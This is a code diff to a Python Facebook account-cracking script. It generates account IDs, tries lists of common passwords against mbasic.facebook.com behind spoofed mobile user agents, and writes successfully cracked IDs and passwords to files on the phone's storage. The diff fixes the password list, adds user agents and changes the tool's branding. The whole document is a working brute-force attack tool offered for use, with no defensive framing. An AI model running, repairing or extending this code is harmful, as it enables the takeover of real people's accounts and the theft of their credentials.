@@ -34,6 +34,9 @@ loop = 0
 oks = []
 cps = []
 loop = 0
+ua = 'Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FN Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36 GSA/11.2.9.21.arm'
+ua = 'Mozilla/5.0 (Linux; U; Android 9; en-gb; CPH1881 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10'
+ua = 'Mozilla/5.0 (Linux; Android 9; STK-LX1 Build/HUAWEISTK-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36 YaApp_Android/10.91 YaSearchBrowser/10.91'
 ugen=[]
 for xd in range(10000):
     aa='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
@@ -72,7 +75,7 @@ def Main():
 		print(50*'━')
 		for guru in user:
 			uid = love+lova+lovb+guru
-			pwx = [lova+lovb+guru,love+lova+lovb,love+love,'bangladesh' 'sadiya' 'hridoy' 'sahin' 'nusrat' 'fatema' 'sabbir'' mababa' '708090' '908070' 'free fire' 'freefire1234']
+			pwx = [lova+lovb+guru,love+lova+lovb,love+love,'bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','mababa','708090','908070','free fire','freefire1234']
 			yaari.submit(test,uid,pwx,tl)
 	print(50*'━')
 	print(' <> CRACK DONE......... ')
@@ -86,7 +89,7 @@ def test(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r\033[1;90m[\033[1;92mT-C-404\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r\033[1;90m[\033[1;92mRJ-404\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             free_fb = session.get('https://mbasic.facebook.com').text
@@ -126,15 +129,15 @@ def test(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m[T-C-404-OK] '+cid+' ¤ '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m[RJ-404-OK] '+cid+' ¤ '+ps+'\33[0;92m')
                 oks.append(cid)
-                open('/sdcard/T-C-404-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/RJ-404-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f"\r\33[1;92m[T-C-404-CP] {cid} ¤ {ps}")
-                open('/sdcard/T-C-404-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                print(f"\r\33[1;92m[RJ-404-CP] {uid} ¤ {ps}")
+                open('/sdcard/RJ-404-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
